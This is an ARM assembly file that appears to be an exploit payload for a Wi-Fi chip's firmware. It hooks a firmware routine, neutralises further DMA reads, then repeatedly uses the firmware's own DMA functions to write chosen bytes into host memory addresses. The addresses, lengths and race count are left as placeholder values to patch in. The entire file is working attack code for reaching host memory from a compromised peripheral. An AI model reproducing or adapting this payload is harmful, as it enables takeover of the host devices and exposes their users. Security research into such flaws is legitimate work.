.code 16
  PUSH {R0}
  ADR R0, hook_arm
  BX R0

.code 32
.align 4
hook_arm:
  POP {R0}

  PUSH {R4-R11, LR}
  
  //Preventing all further DMA reads 
  //This stops the firmware from attempting OOB reads into IO-Space
  //addresses that don't exist (as a result of us modifying the ring indices)
  LDR R0, pcidi_h2d
  ADD R0, R0, #0x34
  ADR R1, junk
  STR R1, [R0]           //txregs
  STR R1, [R0, #4]       //rxregs
  
  //Iteratively DMAing into the requested addresses
  MOV R9, #0
  LDR R10, num_races
loop:
  CMP R9, R10
  BGE ret_zero

  //DMA #1
  ADR R0, dma_contents1
  LDR R1, dma_len1
  LDR R2, hostaddr1
  MOV R3, #0
  BL dma_d2h

  //DMA #2
  ADR R0, dma_contents2
  LDR R1, dma_len2
  LDR R2, hostaddr2
  MOV R3, #1
  BL dma_d2h
  
  ADD R9, R9, #1
  B loop 

ret_zero:
  //Returning zero
  MOV R0, #0
  POP {R4-R11, PC}

.align 4
dma_d2h:
  //R0 - DMA Contents Address
  //R1 - Size
  //R2 - Host Address
  //R3 - Commit
  PUSH {R4-R11, LR}
  MOV R6, R0            //contents
  MOV R7, R1            //size
  MOV R8, R2            //hostaddr
  MOV R9, R3            //commit

  //Adding an RX descriptor
  LDR R0, pcidi_d2h      //DMA context
  MOV R1, R8             //hostaddr-lo
  MOV R2, #0             //hostaddr-hi
  MOV R3, R7             //size
  LDR R4, dma_rxfast
  BLX R4

  //Adding the corresponding TX descriptor
  LDR R0, pcidi_d2h      //DMA contents
  MOV R1, R6             //fwaddr
  MOV R2, R7             //size
  MOV R3, R9             //commit
  LDR R4, dma64_txunframed
  BLX R4

  POP {R4-R11, PC} 

.align 4
dma64_txunframed:
    .word 0x8F54+1

.align 4
pcidi_d2h:
    .word 0x1F6810

.align 4
pcidi_h2d:
    .word 0x1F7320

.align 4
dma_rxfast:
    .word 0x7CB0+1

.align 4
num_races:
    .word 0xBEEF0404

.align 4
hostaddr1:
    .word 0xBEEF0303

.align 4
hostaddr2:
    .word 0xBEEF0505

.align 4
dma_len1:
    .word 0xBEEF0101

.align 4
dma_len2:
    .word 0xBEEF0202

.align 4
dma_contents1:
    .space 16,0xAB

.align 4
dma_contents2:
    .space 16,0xCD

.align 4
junk:
    .space 32,0x00
